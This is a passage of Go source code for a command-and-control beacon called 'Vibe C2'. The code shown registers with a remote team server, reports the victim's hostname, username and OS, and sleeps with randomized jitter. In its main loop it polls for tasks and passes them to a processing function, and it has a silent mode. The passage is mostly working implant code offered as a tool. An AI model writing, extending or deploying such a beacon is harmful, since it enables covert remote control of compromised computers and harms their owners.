	defer resp.Body.Close()

	// Check response
	if resp.StatusCode != http.StatusOK {
		bodyBytes, _ := io.ReadAll(resp.Body)
		writeErrorToFile(fmt.Sprintf("Config update failed with status %d: %s", resp.StatusCode, string(bodyBytes)))
		return
	}

	writeErrorToFile("Successfully updated beacon configuration on team server")
}

// Helper to safely extract the task ID from a task object
func getTaskID(task Task) string {
	// Task ID is a string in our structure
	return task.ID
}

// Calculate sleep time with jitter - safer implementation for Windows
func calculateSleepWithJitter(baseSeconds, jitterPercent int) time.Duration {
	writeErrorToFile(fmt.Sprintf("Calculating sleep with base=%d, jitter=%d%%", baseSeconds, jitterPercent))

	// Validate input parameters to prevent crashes
	if baseSeconds <= 0 {
		baseSeconds = 30 // Default to 30 seconds if invalid
		writeErrorToFile("Invalid sleep time, using default 30 seconds")
	}

	// Ensure jitter is within reasonable bounds
	jitterPct := jitterPercent
	if jitterPct < 0 {
		jitterPct = 0
		writeErrorToFile("Negative jitter value capped at 0%")
	} else if jitterPct > 50 {
		jitterPct = 50
		writeErrorToFile("Excessive jitter value capped at 50%")
	}

	// No jitter case - just return the base time
	if jitterPct <= 0 {
		writeErrorToFile(fmt.Sprintf("No jitter applied, sleeping for %d seconds", baseSeconds))
		return time.Duration(baseSeconds) * time.Second
	}

	// Calculate the jitter range safely
	var jitterRange int
	try := func() {
		defer func() {
			if r := recover(); r != nil {
				writeErrorToFile(fmt.Sprintf("Panic in jitter calculation: %v", r))
				jitterRange = 0 // Set to 0 to disable jitter
			}
		}()

		jitterRange = int(float64(baseSeconds) * float64(jitterPct) / 100.0)
	}
	try()

	// Handle invalid jitter range
	if jitterRange <= 0 {
		writeErrorToFile("Jitter calculation resulted in zero range, using base sleep time")
		return time.Duration(baseSeconds) * time.Second
	}

	// Generate a random value within the jitter range
	jitterValue := 0
	try = func() {
		defer func() {
			if r := recover(); r != nil {
				writeErrorToFile(fmt.Sprintf("Panic in random number generation: %v", r))
				jitterValue = 0 // No jitter if random fails
			}
		}()

		jitterValue = rand.Intn(jitterRange*2) - jitterRange
	}
	try()

	// Apply jitter to base sleep time, ensuring it doesn't go below 1 second
	actualSleep := baseSeconds + jitterValue
	if actualSleep < 1 {
		actualSleep = 1
	}

	writeErrorToFile(fmt.Sprintf("Final sleep calculation: %d seconds (base=%d, jitter=%d)",
		actualSleep, baseSeconds, jitterValue))

	return time.Duration(actualSleep) * time.Second
}

// writeErrorToFile writes an error message to a log file for debugging
func writeErrorToFile(errorMsg string) {
	logPath := "vibe-beacon-error.log"
	f, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return // Can't do much if we can't open the log file
	}
	defer f.Close()

	timestamp := time.Now().Format("2006-01-02 15:04:05")
	f.WriteString(fmt.Sprintf("[%s] %s\n", timestamp, errorMsg))
}

func main() {
	// Add recovery to prevent crashing
	defer func() {
		if r := recover(); r != nil {
			errorMsg := fmt.Sprintf("FATAL ERROR: %v", r)
			writeErrorToFile(errorMsg)

			// Create a readable error message and wait for user to read it
			fmt.Printf("\nVibe C2 beacon encountered a fatal error: %v\n", r)
			fmt.Println("Error has been logged to vibe-beacon-error.log")
			fmt.Println("Press Enter to exit...")

			// Read a line but don't worry about errors - just to pause
			buf := make([]byte, 1)
			os.Stdin.Read(buf)
		}
	}()

	// Create a log file for non-crash errors too
	writeErrorToFile("Beacon starting up")

	// Short delay to ensure console is ready (helps on Windows)
	time.Sleep(500 * time.Millisecond)

	// Don't show banner in silent mode
	if !silent {
		displayBanner()
	}

	// Print banner and configuration if not in silent mode
	if !silent {
		logInfo("Starting Go beacon with configuration:")
		logInfo("  Server URL: %s", serverURL)
		logInfo("  Sleep time: %d seconds", sleepTime)
		logInfo("  Jitter: %d%%", jitterPercent)
		logInfo("  Hostname: %s", hostname)
		logInfo("  Username: %s", username)
		logInfo("  OS: %s", osType)
		logInfo("  Debug mode: %t", debug)
		logInfo("  Silent mode: %t", silent)
	}

	// Log critical info to file as well
	writeErrorToFile(fmt.Sprintf("Server URL: %s", serverURL))
	writeErrorToFile(fmt.Sprintf("OS: %s, Hostname: %s", osType, hostname))

	// Delay startup for a moment to ensure console setup is complete
	time.Sleep(1 * time.Second)

	// Register beacon with team server
	writeErrorToFile("Attempting to connect to: " + serverURL)

	err := registerBeacon()
	if err != nil {
		errorMsg := fmt.Sprintf("Registration failed: %v", err)
		logError(errorMsg)
		writeErrorToFile(errorMsg)

		// Always show error and wait before exiting
		fmt.Printf("\nFailed to connect to server: %v\n", err)
		fmt.Println("Error has been logged to vibe-beacon-error.log")
		fmt.Println("Press Enter to exit...")

		// Read a line but don't worry about errors - just to pause
		buf := make([]byte, 1)
		os.Stdin.Read(buf)

		os.Exit(1)
	}

	writeErrorToFile("Registration successful")
	logInfo("Starting beacon loop (sleep: %d seconds)", sleepTime)

	// Main beacon loop with robust error handling
	for !terminated {
		// Wrap the entire loop body in a recovery function to prevent crashes
		func() {
			defer func() {
				if r := recover(); r != nil {
					errorMsg := fmt.Sprintf("Recovered from panic in main loop: %v", r)
					writeErrorToFile(errorMsg)
					logError(errorMsg)
				}
			}()

			// Calculate sleep with jitter
			writeErrorToFile(fmt.Sprintf("Starting sleep calculation: base=%d, jitter=%d%%", sleepTime, jitterPercent))
			actualSleepDuration := calculateSleepWithJitter(sleepTime, jitterPercent)
			actualSleepSeconds := int(actualSleepDuration / time.Second)

			if jitterPercent > 0 {
				logDebug("Sleeping for %d seconds (jittered from base %d seconds)", actualSleepSeconds, sleepTime)
			} else {
				logDebug("Sleeping for %d seconds (no jitter)", sleepTime)
			}

			// Use fixed sleep duration if calculated value is invalid
			if actualSleepDuration < time.Second || actualSleepDuration > time.Hour {
				writeErrorToFile("Invalid sleep duration calculated, using 30 seconds instead")
				actualSleepDuration = 30 * time.Second
			}

			writeErrorToFile(fmt.Sprintf("Sleeping for %d seconds", actualSleepSeconds))
			time.Sleep(actualSleepDuration)
			writeErrorToFile("Woke up from sleep, checking in with server")

			// Check in and get tasks with error handling
			var tasks []Task
			var err error
			checkInSuccess := false

			// Define and execute the check-in with recovery
			func() {
				defer func() {
					if r := recover(); r != nil {
						errorMsg := fmt.Sprintf("Panic during check-in: %v", r)
						writeErrorToFile(errorMsg)
					}
				}()

				tasks, err = checkIn()
				checkInSuccess = (err == nil)
			}()
			if !checkInSuccess {
				logError("Check-in failed: %v", err)
				writeErrorToFile(fmt.Sprintf("Check-in failed: %v", err))
				return // Return from the inner function to continue the loop
			}

			// Process tasks if any
			if len(tasks) > 0 {
				writeErrorToFile(fmt.Sprintf("Processing %d tasks", len(tasks)))
				processTasks(tasks)
			} else {
				writeErrorToFile("No tasks received")
			}
		}()

		// Small sleep to prevent tight loop if there's a panic
		time.Sleep(100 * time.Millisecond)
	}

	logInfo("Beacon terminated")
}
